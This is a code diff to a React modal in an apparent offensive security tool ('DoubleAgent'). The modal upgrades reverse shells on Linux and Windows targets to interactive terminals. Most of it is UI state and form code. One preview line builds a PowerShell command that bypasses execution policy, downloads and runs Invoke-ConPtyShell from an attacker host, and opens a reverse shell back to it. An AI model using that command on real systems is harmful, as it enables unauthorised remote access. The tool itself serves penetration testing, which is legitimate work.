@@ -13,6 +13,7 @@ export interface ShellStabilizeRequest {
   rows: number;
   lhost?: string;
   lport?: number;
+  resetTerminal?: boolean;
 }
 
 export interface ShellStabilizeModalProps {
@@ -36,12 +37,14 @@ export function ShellStabilizeModal({
   onStabilize,
   onClose,
 }: ShellStabilizeModalProps): React.JSX.Element | null {
+  const [targetOs, setTargetOs] = useState<'linux' | 'windows'>('linux');
   const [mode, setMode] = useState<ShellStabilizeMode>(isRawTcp ? 'direct' : 'nested_nc');
   const [method, setMethod] = useState<ShellStabilizeMethod>('python3');
   const [shellPath, setShellPath] = useState<string>('/bin/bash');
   const [term, setTerm] = useState<string>('xterm-256color');
   const [cols, setCols] = useState<number>(initialCols || 120);
   const [rows, setRows] = useState<number>(initialRows || 32);
+  const [resetTerminal, setResetTerminal] = useState<boolean>(true);
   const [lhost, setLhost] = useState<string>('10.10.14.1');
   const [lport, setLport] = useState<number>(4444);
   const [isRunning, setIsRunning] = useState<boolean>(false);
@@ -50,7 +53,10 @@ export function ShellStabilizeModal({
 
   useEffect(() => {
     if (isOpen) {
+      setTargetOs('linux');
       setMode(isRawTcp ? 'direct' : 'nested_nc');
+      setMethod('python3');
+      setResetTerminal(true);
       setCols(initialCols || 120);
       setRows(initialRows || 32);
       setErrorMsg('');
@@ -59,7 +65,7 @@ export function ShellStabilizeModal({
   }, [isOpen, isRawTcp, initialCols, initialRows]);
 
   const previewSteps = useMemo(() => {
-    if (mode === 'windows_conpty' || method === 'conptyshell') {
+    if (targetOs === 'windows' || mode === 'windows_conpty' || method === 'conptyshell') {
       return [
         `powershell -NoP -NonI -Exec Bypass -Command "IEX(IWR http://${lhost}:${lport}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${lhost} ${lport} -Rows ${rows} -Cols ${cols}"`,
       ];
@@ -77,16 +83,23 @@ export function ShellStabilizeModal({
     const resize = `export TERM=${term} SHELL=${shellPath}; stty rows ${rows} cols ${cols}`;
 
     if (mode === 'nested_nc') {
-      return [
-        spawn,
-        '^Z  (Ctrl+Z — background outer netcat)',
-        'stty raw -echo; fg',
-        resize,
+      const steps = [
+        `# Step 1 — on target: spawn PTY\n${spawn}`,
+        `# Step 2 — background outer shell\n^Z  (Ctrl+Z)`,
+        `# Step 3 — on attacker: configure raw mode\nstty raw -echo; fg`,
       ];
+      if (resetTerminal) {
+        steps.push(`# Step 4 — on target: reset terminal\nreset`);
+      }
+      steps.push(`# Step ${resetTerminal ? 5 : 4} — on target: set environment & geometry\n${resize}`);
+      return steps;
     }
 
-    return [spawn, resize];
-  }, [mode, method, shellPath, term, cols, rows, lhost, lport]);
+    return [
+      `# Direct Mode (DoubleAgent Raw Listener)\n${spawn}`,
+      `# Remote environment & geometry sync\n${resize}`,
+    ];
+  }, [targetOs, mode, method, shellPath, term, cols, rows, resetTerminal, lhost, lport]);
 
   if (!isOpen) return null;
 
@@ -97,14 +110,15 @@ export function ShellStabilizeModal({
     try {
       await onStabilize({
         sessionId,
-        method,
-        mode,
+        method: targetOs === 'windows' ? 'conptyshell' : method,
+        mode: targetOs === 'windows' ? 'windows_conpty' : mode,
         shellPath,
         term,
         cols,
         rows,
         lhost,
         lport,
+        resetTerminal: targetOs === 'linux' && mode === 'nested_nc' ? resetTerminal : false,
       });
       onClose();
     } catch (err: unknown) {
@@ -227,59 +241,95 @@ export function ShellStabilizeModal({
               </div>
             </div>
 
-            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
-              <div>
-                <label className="cyber-label" htmlFor="stab-mode">
-                  Session Topology Mode
-                </label>
-                <select
-                  id="stab-mode"
-                  className="cyber-hud-select"
-                  value={mode}
-                  onChange={(e) => {
-                    const nextMode = e.target.value as ShellStabilizeMode;
-                    setMode(nextMode);
-                    if (nextMode === 'windows_conpty') {
-                      setMethod('conptyshell');
-                    } else if (method === 'conptyshell') {
-                      setMethod('python3');
-                    }
+            {/* Target Platform Selector (Linux vs Windows) */}
+            <div>
+              <label className="cyber-label">Target Host Platform</label>
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem' }}>
+                <button
+                  type="button"
+                  className={`cyber-btn ${targetOs === 'linux' ? 'cyber-btn-primary' : 'cyber-btn-secondary'}`}
+                  style={{ justifyContent: 'center', fontWeight: targetOs === 'linux' ? 700 : 400 }}
+                  onClick={() => {
+                    setTargetOs('linux');
+                    setMode(isRawTcp ? 'direct' : 'nested_nc');
+                    setMethod('python3');
                   }}
                 >
-                  <option value="direct">⚡ Direct Raw Socket / Listener (No Ctrl+Z)</option>
-                  <option value="nested_nc">🔄 Nested Netcat in SSH (Ctrl+Z + stty raw -echo; fg)</option>
-                  <option value="windows_conpty">🪟 Windows ConPtyShell Upgrade</option>
-                </select>
-              </div>
-
-              <div>
-                <label className="cyber-label" htmlFor="stab-method">
-                  PTY Spawn Method
-                </label>
-                <select
-                  id="stab-method"
-                  className="cyber-hud-select"
-                  value={method}
-                  onChange={(e) => {
-                    const nextMethod = e.target.value as ShellStabilizeMethod;
-                    setMethod(nextMethod);
-                    if (nextMethod === 'conptyshell') {
-                      setMode('windows_conpty');
-                    } else if (mode === 'windows_conpty') {
-                      setMode(isRawTcp ? 'direct' : 'nested_nc');
-                    }
+                  🐧 Linux / Unix Target (PTY / stty)
+                </button>
+                <button
+                  type="button"
+                  className={`cyber-btn ${targetOs === 'windows' ? 'cyber-btn-primary' : 'cyber-btn-secondary'}`}
+                  style={{ justifyContent: 'center', fontWeight: targetOs === 'windows' ? 700 : 400 }}
+                  onClick={() => {
+                    setTargetOs('windows');
+                    setMode('windows_conpty');
+                    setMethod('conptyshell');
                   }}
                 >
-                  <option value="python3">🐍 Python 3 (pty.spawn)</option>
-                  <option value="python">🐍 Python 2 (pty.spawn)</option>
-                  <option value="script">📜 script -qc /dev/null</option>
-                  <option value="perl">🐪 Perl exec</option>
-                  <option value="conptyshell">🪟 Windows ConPtyShell</option>
-                </select>
+                  🪟 Windows Target (ConPTY / PseudoConsole)
+                </button>
               </div>
             </div>
 
-            {mode === 'windows_conpty' || method === 'conptyshell' ? (
+            {targetOs === 'windows' ? (
+              <div
+                style={{
+                  background: 'rgba(56, 189, 248, 0.08)',
+                  border: '1px solid rgba(56, 189, 248, 0.3)',
+                  padding: '0.65rem 0.85rem',
+                  fontSize: '0.74rem',
+                  lineHeight: '1.4',
+                  color: '#bae6fd',
+                }}
+              >
+                <strong>Windows vs. Linux Architecture:</strong> Windows targets lack Unix <code style={{ color: '#00f0ff' }}>/dev/pts</code> and <code style={{ color: '#00f0ff' }}>stty</code>. Standard Python PTY spawning and raw mode will fail on Windows. DoubleAgent uses <strong>ConPTY</strong> (Windows 10/11 &amp; Server 2019+) via <code style={{ color: '#00f0ff' }}>Invoke-ConPtyShell</code> to spawn a true interactive pseudo-console with VT100 escape sequences, arrow keys, and full PowerShell PSReadLine support.
+              </div>
+            ) : null}
+
+            {targetOs === 'linux' && (
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.75rem' }}>
+                <div>
+                  <label className="cyber-label" htmlFor="stab-mode">
+                    Session Topology Mode
+                  </label>
+                  <select
+                    id="stab-mode"
+                    className="cyber-hud-select"
+                    value={mode}
+                    onChange={(e) => {
+                      const nextMode = e.target.value as ShellStabilizeMode;
+                      setMode(nextMode);
+                    }}
+                  >
+                    <option value="direct">⚡ Direct Raw Socket / Listener (No Ctrl+Z)</option>
+                    <option value="nested_nc">🔄 Nested Netcat in SSH (Ctrl+Z + stty raw -echo; fg)</option>
+                  </select>
+                </div>
+
+                <div>
+                  <label className="cyber-label" htmlFor="stab-method">
+                    PTY Spawn Method
+                  </label>
+                  <select
+                    id="stab-method"
+                    className="cyber-hud-select"
+                    value={method}
+                    onChange={(e) => {
+                      const nextMethod = e.target.value as ShellStabilizeMethod;
+                      setMethod(nextMethod);
+                    }}
+                  >
+                    <option value="python3">🐍 Python 3 (pty.spawn)</option>
+                    <option value="python">🐍 Python 2 (pty.spawn)</option>
+                    <option value="script">📜 script -qc /dev/null</option>
+                    <option value="perl">🐪 Perl exec</option>
+                  </select>
+                </div>
+              </div>
+            )}
+
+            {targetOs === 'windows' ? (
               <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr 1fr 1fr', gap: '0.75rem' }}>
                 <div>
                   <label className="cyber-label" htmlFor="stab-lhost">
@@ -331,59 +381,85 @@ export function ShellStabilizeModal({
                 </div>
               </div>
             ) : (
-              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 85px 85px', gap: '0.75rem' }}>
-                <div>
-                  <label className="cyber-label" htmlFor="stab-shell">
-                    Target Shell Binary
-                  </label>
-                  <select
-                    id="stab-shell"
-                    className="cyber-hud-select font-mono"
-                    value={shellPath}
-                    onChange={(e) => setShellPath(e.target.value)}
+              <>
+                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 85px 85px', gap: '0.75rem' }}>
+                  <div>
+                    <label className="cyber-label" htmlFor="stab-shell">
+                      Target Shell Binary
+                    </label>
+                    <select
+                      id="stab-shell"
+                      className="cyber-hud-select font-mono"
+                      value={shellPath}
+                      onChange={(e) => setShellPath(e.target.value)}
+                    >
+                      <option value="/bin/bash">/bin/bash</option>
+                      <option value="/bin/sh">/bin/sh</option>
+                      <option value="/bin/zsh">/bin/zsh</option>
+                      <option value="/bin/ash">/bin/ash</option>
+                    </select>
+                  </div>
+                  <div>
+                    <label className="cyber-label" htmlFor="stab-term">
+                      TERM Type
+                    </label>
+                    <input
+                      id="stab-term"
+                      className="cyber-hud-input font-mono"
+                      value={term}
+                      onChange={(e) => setTerm(e.target.value)}
+                    />
+                  </div>
+                  <div>
+                    <label className="cyber-label" htmlFor="stab-cols">
+                      Cols
+                    </label>
+                    <input
+                      id="stab-cols"
+                      type="number"
+                      className="cyber-hud-input font-mono"
+                      value={cols}
+                      onChange={(e) => setCols(Number(e.target.value) || 120)}
+                    />
+                  </div>
+                  <div>
+                    <label className="cyber-label" htmlFor="stab-rows">
+                      Rows
+                    </label>
+                    <input
+                      id="stab-rows"
+                      type="number"
+                      className="cyber-hud-input font-mono"
+                      value={rows}
+                      onChange={(e) => setRows(Number(e.target.value) || 32)}
+                    />
+                  </div>
+                </div>
+
+                {mode === 'nested_nc' && (
+                  <label
+                    style={{
+                      display: 'flex',
+                      alignItems: 'center',
+                      gap: '0.5rem',
+                      fontSize: '0.78rem',
+                      color: '#94a3b8',
+                      cursor: 'pointer',
+                      userSelect: 'none',
+                    }}
                   >
-                    <option value="/bin/bash">/bin/bash</option>
-                    <option value="/bin/sh">/bin/sh</option>
-                    <option value="/bin/zsh">/bin/zsh</option>
-                    <option value="/bin/ash">/bin/ash</option>
-                  </select>
-                </div>
-                <div>
-                  <label className="cyber-label" htmlFor="stab-term">
-                    TERM Type
+                    <input
+                      type="checkbox"
+                      checked={resetTerminal}
+                      onChange={(e) => setResetTerminal(e.target.checked)}
+                      style={{ cursor: 'pointer', accentColor: '#00f0ff' }}
+                    />
+                    <span>
+                      <strong style={{ color: '#e2e8f0' }}>Step 4:</strong> Send <code style={{ color: '#00f0ff' }}>reset</code> command after <code style={{ color: '#00f0ff' }}>fg</code> (resets terminal driver &amp; redraws prompt)
+                    </span>
                   </label>
-                  <input
-                    id="stab-term"
-                    className="cyber-hud-input font-mono"
-                    value={term}
-                    onChange={(e) => setTerm(e.target.value)}
-                  />
-                </div>
-                <div>
-                  <label className="cyber-label" htmlFor="stab-cols">
-                    Cols
-                  </label>
-                  <input
-                    id="stab-cols"
-                    type="number"
-                    className="cyber-hud-input font-mono"
-                    value={cols}
-                    onChange={(e) => setCols(Number(e.target.value) || 120)}
-                  />
-                </div>
-                <div>
-                  <label className="cyber-label" htmlFor="stab-rows">
-                    Rows
-                  </label>
-                  <input
-                    id="stab-rows"
-                    type="number"
-                    className="cyber-hud-input font-mono"
-                    value={rows}
-                    onChange={(e) => setRows(Number(e.target.value) || 32)}
-                  />
-                </div>
-              </div>
+                )}
+              </>
             )}
 
             {/* Sequence Preview */}
